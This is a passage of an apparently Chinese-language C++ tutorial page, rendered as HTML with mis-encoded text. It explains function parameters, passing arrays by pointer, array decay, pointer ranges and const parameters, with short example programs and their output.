class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°å®šä¹‰ï¼šæ¥å—ä¸¤ä¸ª int å‚æ•°ï¼Œè¿”å›è¾ƒå¤§çš„é‚£ä¸ª int</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (a &gt; b) &#123;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// æˆ–è€…ä½¿ç”¨ä¸‰å…ƒè¿ç®—ç¬¦: return (a &gt; b) ? a : b;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> num1 = <span class="number">15</span>;</span><br><span class="line">    <span class="keyword">int</span> num2 = <span class="number">28</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è°ƒç”¨å‡½æ•°ï¼Œä¼ é€’ä¸¤ä¸ªå®å‚</span></span><br><span class="line">    <span class="keyword">int</span> larger_value = max(num1, num2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Between &quot;</span> &lt;&lt; num1 &lt;&lt; <span class="string">&quot; and &quot;</span> &lt;&lt; num2</span><br><span class="line">              &lt;&lt; <span class="string">&quot;, the larger value is: &quot;</span> &lt;&lt; larger_value &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: 28</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¹Ÿå¯ä»¥ç›´æ¥åœ¨è¾“å‡ºè¯­å¥ä¸­è°ƒç”¨</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The max of 100 and 99 is: &quot;</span> &lt;&lt; max(<span class="number">100</span>, <span class="number">99</span>) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: 100</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªä¾‹å­å†æ¬¡å±•ç¤ºäº†å¦‚ä½•å®šä¹‰å’Œè°ƒç”¨å¸¦æœ‰å¤šä¸ªå‚æ•°çš„å‡½æ•°ï¼Œå¹¶ä¸”è¯¥å‡½æ•°è¿˜è¿”å›ä¸€ä¸ªå€¼ã€‚å‚æ•° <code>a</code> å’Œ <code>b</code> ä¹Ÿæ˜¯æŒ‰å€¼ä¼ é€’çš„ã€‚</p><h2 id="7-3-å‡½æ•°å’Œæ•°ç»„"><a href="#7-3-å‡½æ•°å’Œæ•°ç»„" class="headerlink" title="7.3 å‡½æ•°å’Œæ•°ç»„"></a>7.3 å‡½æ•°å’Œæ•°ç»„</h2><p>å°†æ•°ç»„ä¼ é€’ç»™å‡½æ•°æ˜¯ C++ ä¸­å¸¸è§çš„æ“ä½œï¼Œä½†å…¶å·¥ä½œæ–¹å¼ä¸ä¼ é€’æ™®é€šå˜é‡ï¼ˆå¦‚ <code>int</code> æˆ– <code>double</code>ï¼‰æœ‰æ˜¾è‘—ä¸åŒã€‚ç†è§£è¿™ç§å·®å¼‚å¯¹äºæ­£ç¡®ä½¿ç”¨æ•°ç»„ä½œä¸ºå‡½æ•°å‚æ•°è‡³å…³é‡è¦ã€‚</p><p>ä¸åŸºæœ¬ç±»å‹é»˜è®¤ä½¿ç”¨â€œæŒ‰å€¼ä¼ é€’â€ï¼ˆåˆ›å»ºå‰¯æœ¬ï¼‰ä¸åŒï¼Œå½“å°†æ•°ç»„ä¼ é€’ç»™å‡½æ•°æ—¶ï¼ŒC++ <strong>ä¸ä¼š</strong>å¤åˆ¶æ•´ä¸ªæ•°ç»„ã€‚ç›¸åï¼Œå®ƒä¼ é€’çš„æ˜¯æ•°ç»„<strong>ç¬¬ä¸€ä¸ªå…ƒç´ çš„å†…å­˜åœ°å€</strong>ã€‚è¿™æ„å‘³ç€å‡½æ•°å®é™…ä¸Šæ¥æ”¶çš„æ˜¯ä¸€ä¸ªæŒ‡å‘æ•°ç»„èµ·å§‹ä½ç½®çš„æŒ‡é’ˆã€‚</p><h3 id="7-3-1-å‡½æ•°å¦‚ä½•ä½¿ç”¨æŒ‡é’ˆæ¥å¤„ç†æ•°ç»„"><a href="#7-3-1-å‡½æ•°å¦‚ä½•ä½¿ç”¨æŒ‡é’ˆæ¥å¤„ç†æ•°ç»„" class="headerlink" title="7.3.1 å‡½æ•°å¦‚ä½•ä½¿ç”¨æŒ‡é’ˆæ¥å¤„ç†æ•°ç»„"></a>7.3.1 å‡½æ•°å¦‚ä½•ä½¿ç”¨æŒ‡é’ˆæ¥å¤„ç†æ•°ç»„</h3><p>å› ä¸ºå‡½æ•°æ¥æ”¶çš„æ˜¯æ•°ç»„çš„åœ°å€ï¼ˆæŒ‡é’ˆï¼‰ï¼Œæ‰€ä»¥å®ƒå¯ä»¥é€šè¿‡è¿™ä¸ªåœ°å€ç›´æ¥è®¿é—®å’Œä¿®æ”¹åŸå§‹æ•°ç»„çš„å†…å®¹ã€‚è¿™ä¸æŒ‰å€¼ä¼ é€’å®Œå…¨ä¸åŒï¼Œåè€…æ“ä½œçš„æ˜¯å‰¯æœ¬ã€‚</p><p>åœ¨å‡½æ•°å®šä¹‰ä¸­ï¼Œæ¥æ”¶æ•°ç»„å‚æ•°æœ‰å‡ ç§ç­‰æ•ˆçš„è¯­æ³•ï¼š</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è¯­æ³• 1: ä½¿ç”¨æŒ‡é’ˆè¡¨ç¤ºæ³•</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process_array</span><span class="params">(<span class="keyword">int</span>* arr, <span class="keyword">int</span> size)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¯­æ³• 2: ä½¿ç”¨å¸¦ç©ºæ‹¬å·çš„æ•°ç»„è¡¨ç¤ºæ³•</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">process_array</span><span class="params">(<span class="keyword">int</span> arr[], <span class="keyword">int</span> size)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// è¯­æ³• 3: ä½¿ç”¨å¸¦æŒ‡å®šå¤§å°çš„æ•°ç»„è¡¨ç¤ºæ³• (å¤§å°ä¼šè¢«å¿½ç•¥ï¼Œä¸æ¨è)</span></span><br><span class="line"><span class="comment">// void process_array(int arr[10], int size); // è¿™é‡Œçš„ 10 å®é™…ä¸Šæ²¡æœ‰ä½œç”¨</span></span><br></pre></td></tr></table></figure><p>è¿™ä¸‰ç§è¯­æ³•åœ¨å‡½æ•°å‚æ•°åˆ—è¡¨ä¸­æ˜¯ç­‰æ•ˆçš„ï¼Œå®ƒä»¬éƒ½å‘Šè¯‰ç¼–è¯‘å™¨ <code>arr</code> æ˜¯ä¸€ä¸ªæŒ‡å‘ <code>int</code> çš„æŒ‡é’ˆã€‚æœ€å¸¸ç”¨çš„æ˜¯è¯­æ³• 1 å’Œè¯­æ³• 2ã€‚</p><p><strong>å…³é”®ç‚¹:</strong> æ— è®ºä½¿ç”¨å“ªç§è¯­æ³•ï¼Œå‡½æ•°éƒ½ä¸çŸ¥é“æ•°ç»„çš„å®é™…å¤§å°ã€‚å› æ­¤ï¼Œé€šå¸¸éœ€è¦å°†æ•°ç»„çš„å¤§å°ä½œä¸º<strong>å•ç‹¬çš„å‚æ•°</strong>ä¼ é€’ç»™å‡½æ•°ã€‚</p><p><strong>ç¤ºä¾‹ï¼šå‡½æ•°ä¿®æ”¹æ•°ç»„å…ƒç´ </strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°åŸå‹ï¼šæ¥æ”¶ä¸€ä¸ª int æŒ‡é’ˆ (æ•°ç»„) å’Œå¤§å°</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">double_elements</span><span class="params">(<span class="keyword">int</span> arr[], <span class="keyword">int</span> size)</span> </span>&#123; <span class="comment">// æˆ–è€… int* arr</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Inside function: Modifying array elements...&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i) &#123;</span><br><span class="line">        arr[i] *= <span class="number">2</span>; <span class="comment">// ç›´æ¥ä¿®æ”¹åŸå§‹æ•°ç»„çš„å…ƒç´ </span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> my_array[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> array_size = <span class="keyword">sizeof</span>(my_array) / <span class="keyword">sizeof</span>(my_array[<span class="number">0</span>]); <span class="comment">// è®¡ç®—æ•°ç»„å¤§å°</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Before calling function: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; array_size; ++i) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; my_array[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è°ƒç”¨å‡½æ•°ï¼Œä¼ é€’æ•°ç»„å (å³åœ°å€) å’Œå¤§å°</span></span><br><span class="line">    double_elements(my_array, array_size);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;After calling function: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; array_size; ++i) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; my_array[i] &lt;&lt; <span class="string">&quot; &quot;</span>; <span class="comment">// æ•°ç»„å†…å®¹å·²è¢«ä¿®æ”¹</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è¾“å‡º:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Before calling function: 1 2 3 4 5</span><br><span class="line">Inside function: Modifying array elements...</span><br><span class="line">After calling function: 2 4 6 8 10</span><br></pre></td></tr></table></figure><p><strong>ä»£ç è§£é‡Š:</strong></p><ol><li> <code>main</code> å‡½æ•°å®šä¹‰äº†ä¸€ä¸ªæ•°ç»„ <code>my_array</code>ã€‚</li><li> è°ƒç”¨ <code>double_elements(my_array, array_size)</code> æ—¶ï¼Œ<code>my_array</code> (ä»£è¡¨æ•°ç»„é¦–å…ƒç´ çš„åœ°å€) è¢«ä¼ é€’ç»™å‡½æ•°çš„ <code>arr</code> å‚æ•°ï¼Œ<code>array_size</code> è¢«ä¼ é€’ç»™ <code>size</code> å‚æ•°ã€‚</li><li> å‡½æ•°å†…éƒ¨é€šè¿‡æŒ‡é’ˆ <code>arr</code> è®¿é—®å¹¶ä¿®æ”¹äº† <code>main</code> å‡½æ•°ä¸­å®šä¹‰çš„ <code>my_array</code> çš„å…ƒç´ ã€‚</li><li> å‡½æ•°è¿”å›åï¼Œ<code>main</code> å‡½æ•°ä¸­çš„ <code>my_array</code> çš„å†…å®¹ç¡®å®å‘ç”Ÿäº†æ”¹å˜ã€‚</li></ol><h3 id="7-3-2-å°†æ•°ç»„ä½œä¸ºå‚æ•°æ„å‘³ç€ä»€ä¹ˆ"><a href="#7-3-2-å°†æ•°ç»„ä½œä¸ºå‚æ•°æ„å‘³ç€ä»€ä¹ˆ" class="headerlink" title="7.3.2 å°†æ•°ç»„ä½œä¸ºå‚æ•°æ„å‘³ç€ä»€ä¹ˆ"></a>7.3.2 å°†æ•°ç»„ä½œä¸ºå‚æ•°æ„å‘³ç€ä»€ä¹ˆ</h3><p>å°†æ•°ç»„åä¼ é€’ç»™å‡½æ•°æ—¶ï¼Œä¼šå‘ç”Ÿæ‰€è°“çš„â€œæ•°ç»„é€€åŒ–â€ï¼ˆArray Decayï¼‰ã€‚æ•°ç»„åä¼šâ€œé€€åŒ–â€æˆæŒ‡å‘å…¶ç¬¬ä¸€ä¸ªå…ƒç´ çš„æŒ‡é’ˆã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆå‡½æ•°å‚æ•° <code>int arr[]</code> å’Œ <code>int* arr</code> æ˜¯ç­‰ä»·çš„ã€‚</p><p><strong>Implications:</strong></p><ol><li> <strong>æ•ˆç‡:</strong> ä¸éœ€è¦å¤åˆ¶æ•´ä¸ªæ•°ç»„ï¼Œä¼ é€’åœ°å€éå¸¸å¿«ï¼Œå°¤å…¶æ˜¯å¯¹äºå¤§æ•°ç»„ã€‚</li><li> <strong>ä¿®æ”¹èƒ½åŠ›:</strong> å‡½æ•°å¯ä»¥ç›´æ¥ä¿®æ”¹è°ƒç”¨è€…æä¾›çš„åŸå§‹æ•°ç»„ã€‚è¿™æ—¢æ˜¯ä¼˜ç‚¹ï¼ˆå…è®¸å‡½æ•°â€œè¿”å›â€ä¿®æ”¹åçš„æ•°ç»„ï¼‰ä¹Ÿæ˜¯ç¼ºç‚¹ï¼ˆå¯èƒ½æ„å¤–ä¿®æ”¹æ•°æ®ï¼‰ã€‚</li><li> <strong>ä¸¢å¤±å¤§å°ä¿¡æ¯:</strong> å‡½æ•°æœ¬èº«æ— æ³•çŸ¥é“æ•°ç»„çš„å¤§å°ã€‚å¿…é¡»æ˜¾å¼ä¼ é€’å¤§å°ä¿¡æ¯ã€‚</li></ol><h3 id="7-3-3-æ›´å¤šæ•°ç»„å‡½æ•°ç¤ºä¾‹"><a href="#7-3-3-æ›´å¤šæ•°ç»„å‡½æ•°ç¤ºä¾‹" class="headerlink" title="7.3.3 æ›´å¤šæ•°ç»„å‡½æ•°ç¤ºä¾‹"></a>7.3.3 æ›´å¤šæ•°ç»„å‡½æ•°ç¤ºä¾‹</h3><p><strong>ç¤ºä¾‹ 1: è®¡ç®—æ•°ç»„å…ƒç´ æ€»å’Œ</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°ï¼šè®¡ç®—æ•°ç»„å…ƒç´ çš„æ€»å’Œ</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum_array</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span> arr[], <span class="keyword">int</span> size)</span> </span>&#123; <span class="comment">// ä½¿ç”¨ const é˜²æ­¢æ„å¤–ä¿®æ”¹</span></span><br><span class="line">    <span class="keyword">int</span> total = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i) &#123;</span><br><span class="line">        total += arr[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> total;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> data[] = &#123;<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> size = <span class="keyword">sizeof</span>(data) / <span class="keyword">sizeof</span>(data[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">int</span> sum = sum_array(data, size);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sum of array elements: &quot;</span> &lt;&lt; sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: 100</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>ç¤ºä¾‹ 2: æŸ¥æ‰¾æ•°ç»„ä¸­çš„æœ€å¤§å€¼</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;limits&gt; // ä¸ºäº†ä½¿ç”¨ INT_MIN</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°ï¼šæŸ¥æ‰¾æ•°ç»„ä¸­çš„æœ€å¤§å€¼</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find_max</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span>* arr, <span class="keyword">int</span> size)</span> </span>&#123; <span class="comment">// ä½¿ç”¨æŒ‡é’ˆè¡¨ç¤ºæ³•å’Œ const</span></span><br><span class="line">    <span class="keyword">if</span> (size &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">&quot;Error: Array size must be positive.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">std</span>::numeric_limits&lt;<span class="keyword">int</span>&gt;::min(); <span class="comment">// è¿”å›å¯èƒ½çš„æœ€å°å€¼ä½œä¸ºé”™è¯¯æŒ‡ç¤º</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> max_val = arr[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; size; ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (arr[i] &gt; max_val) &#123;</span><br><span class="line">            max_val = arr[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> max_val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> scores[] = &#123;<span class="number">88</span>, <span class="number">95</span>, <span class="number">72</span>, <span class="number">100</span>, <span class="number">91</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="keyword">sizeof</span>(scores) / <span class="keyword">sizeof</span>(scores[<span class="number">0</span>]);</span><br><span class="line">    <span class="keyword">int</span> highest_score = find_max(scores, count);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Highest score: &quot;</span> &lt;&lt; highest_score &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: 100</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-3-4-ä½¿ç”¨æ•°ç»„åŒºé—´çš„å‡½æ•°"><a href="#7-3-4-ä½¿ç”¨æ•°ç»„åŒºé—´çš„å‡½æ•°" class="headerlink" title="7.3.4 ä½¿ç”¨æ•°ç»„åŒºé—´çš„å‡½æ•°"></a>7.3.4 ä½¿ç”¨æ•°ç»„åŒºé—´çš„å‡½æ•°</h3><p>é™¤äº†ä¼ é€’æ•°ç»„é¦–åœ°å€å’Œå¤§å°ä¹‹å¤–ï¼Œå¦ä¸€ç§å¸¸è§ä¸”æ›´çµæ´»çš„æ–¹æ³•æ˜¯ä¼ é€’æŒ‡å‘æ•°ç»„<strong>å¼€å§‹</strong>å’Œ<strong>ç»“æŸä¹‹å</strong>ä½ç½®çš„æŒ‡é’ˆï¼ˆæˆ–è¿­ä»£å™¨ï¼ŒSTL ä¸­å¸¸ç”¨ï¼‰ã€‚è¿™å®šä¹‰äº†ä¸€ä¸ªå¤„ç†èŒƒå›´ <code>[begin, end)</code>ï¼ˆåŒ…å« beginï¼Œä¸åŒ…å« endï¼‰ã€‚</p><p><strong>ç¤ºä¾‹ï¼šä½¿ç”¨æŒ‡é’ˆåŒºé—´æ±‚å’Œ</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å‡½æ•°ï¼šè®¡ç®—ä» begin åˆ° end (ä¸å« end) çš„å…ƒç´ å’Œ</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum_range</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span>* begin, <span class="keyword">const</span> <span class="keyword">int</span>* end)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> total = <span class="number">0</span>;</span><br><span class="line">    <span class="comment">// å¾ªç¯ç›´åˆ°å½“å‰æŒ‡é’ˆè¾¾åˆ° end æŒ‡é’ˆ</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> <span class="keyword">int</span>* ptr = begin; ptr != end; ++ptr) &#123;</span><br><span class="line">        total += *ptr; <span class="comment">// è§£å¼•ç”¨æŒ‡é’ˆè·å–å…ƒç´ å€¼</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> total;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> data[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> size = <span class="keyword">sizeof</span>(data) / <span class="keyword">sizeof</span>(data[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¡ç®—æ•´ä¸ªæ•°ç»„çš„å’Œ</span></span><br><span class="line">    <span class="keyword">int</span> total_sum = sum_range(data, data + size); <span class="comment">// data + size æŒ‡å‘æ•°ç»„æœ«å°¾ä¹‹åçš„ä½ç½®</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Total sum: &quot;</span> &lt;&lt; total_sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: 55</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// è®¡ç®—æ•°ç»„ä¸€éƒ¨åˆ†çš„å’Œ (ä¾‹å¦‚ï¼Œç´¢å¼• 2 åˆ° 6ï¼Œå³å…ƒç´  3, 4, 5, 6, 7)</span></span><br><span class="line">    <span class="keyword">int</span> partial_sum = sum_range(data + <span class="number">2</span>, data + <span class="number">7</span>); <span class="comment">// data+2 æŒ‡å‘ç¬¬3ä¸ªå…ƒç´ , data+7 æŒ‡å‘ç¬¬8ä¸ªå…ƒç´  (åŒºé—´ç»ˆç‚¹)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Partial sum (index 2 to 6): &quot;</span> &lt;&lt; partial_sum &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º: 25</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™ç§æ–¹æ³•åœ¨ C++ æ ‡å‡†åº“ç®—æ³•ä¸­éå¸¸å¸¸ç”¨ã€‚</p><h3 id="7-3-5-æŒ‡é’ˆå’Œ-const"><a href="#7-3-5-æŒ‡é’ˆå’Œ-const" class="headerlink" title="7.3.5 æŒ‡é’ˆå’Œ const"></a>7.3.5 æŒ‡é’ˆå’Œ const</h3><p>å¦‚å‰é¢çš„ç¤ºä¾‹æ‰€ç¤ºï¼Œå¦‚æœå‡½æ•°ä¸åº”è¯¥ä¿®æ”¹ä¼ å…¥çš„æ•°ç»„ï¼Œåº”è¯¥åœ¨å‡½æ•°å‚æ•°ä¸­ä½¿ç”¨ <code>const</code> å…³é”®å­—ã€‚è¿™æ˜¯ä¸€ç§é‡è¦çš„ç¼–ç¨‹å®è·µï¼Œå¯ä»¥æé«˜ä»£ç çš„å®‰å…¨æ€§å’Œæ¸…æ™°åº¦ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// è¿™ä¸ªå‡½æ•°æ‰¿è¯ºä¸ä¼šä¿®æ”¹ arr æŒ‡å‘çš„æ•°ç»„å†…å®¹</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_array</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span> arr[], <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Array elements: &quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; ++i) &#123;</span><br><span class="line">        <span class="comment">// arr[i] = 0; // é”™è¯¯ï¼ç¼–è¯‘å™¨ä¼šé˜»æ­¢ä¿®æ”¹ const æ•°æ®</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; arr[i] &lt;&lt; <span class="string">&quot; 